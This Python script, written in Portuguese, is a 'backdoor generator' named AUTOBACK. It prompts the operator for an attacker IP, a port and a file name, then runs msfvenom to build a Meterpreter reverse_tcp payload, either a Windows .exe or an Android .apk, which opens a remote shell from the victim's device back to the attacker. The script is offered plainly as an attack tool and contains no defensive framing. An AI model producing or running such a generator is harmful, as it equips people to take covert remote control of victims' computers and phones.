import socket
import time
import os
global R, B, C, Y, G, RT, CY, CO
CO='\033[m'
R='\033[1;31m'
B='\033[1;34m'
C='\033[1;37m'
CY='\033[1;36m'
Y='\033[1;33m'
G='\033[1;32m'
RT='\033[;0m'
def main():
	print(f"""{G}
░█████╗░██╗░░░██╗████████╗░█████╗░██████╗░░█████╗░░█████╗░██╗░░██╗
██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║░██╔╝
███████║██║░░░██║░░░██║░░░██║░░██║██████╦╝███████║██║░░╚═╝█████═╝░
██╔══██║██║░░░██║░░░██║░░░██║░░██║██╔══██╗██╔══██║██║░░██╗██╔═██╗░
██║░░██║╚██████╔╝░░░██║░░░╚█████╔╝██████╦╝██║░░██║╚█████╔╝██║░╚██╗
╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░░╚════╝░╚═════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝

▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
▒▒█▒▒▒▄██████████▄▒▒▒▒
▒█▐▒▒▒████████████▒▒▒▒
▒▌▐▒▒██▄▀██████▀▄██▒▒▒
▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
▐┼▐▒▒██████████████▒▒▒
▐▄▐████─▀▐▐▀█─█─▌▐██▄▒ 
▒▒█████──────────▐███▌
▒▒█▀▀██▄█─▄───▐─▄███▀▒ Coded By: Kira"
▒▒█▒▒███████▄██████▒▒▒ 25 de jun de 2021"
▒▒▒▒▒██████████████▒▒▒ AUTOBACK.v01"
▒▒▒▒▒█████████▐▌██▌▒▒▒
▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒{C}
			|======{G}GERADOR DE BACKDOOR{C}======|
			| [ {G}1{C} ] Windows                 |
			| [ {G}2{C} ] Android                 |
			|===============================|
			""")
	op = int(input(f"[{Y}!{C}]{G} Digite a opção que deseja ~/ "))
	ip = input(f"{C}[{Y}!{C}]{G} Digite o seu ip ~/ ")
	port = input(f"{C}[{Y}!{C}]{G} Digite a porta, Recomendado 4444 ~/ ")
	nome = input(f"{C}[{Y}!{C}]{G} Digite o nome do seu backdoor ~/ ")
	if op == 1:
			os.system(f"msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST={ip} LPORT={port} R > {nome}.exe")
			print(f"{G}BACKDOOR CRIADO COM SUCESSO!");time.sleep(2)
	elif op == 2:
		os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} R > {nome}.apk")
		print(f"{G}BACKDOOR CRIADO COM SUCESSO!");time.sleep(2)
	else:
		print(f"{R}Opção Inválida!");time.sleep(2)
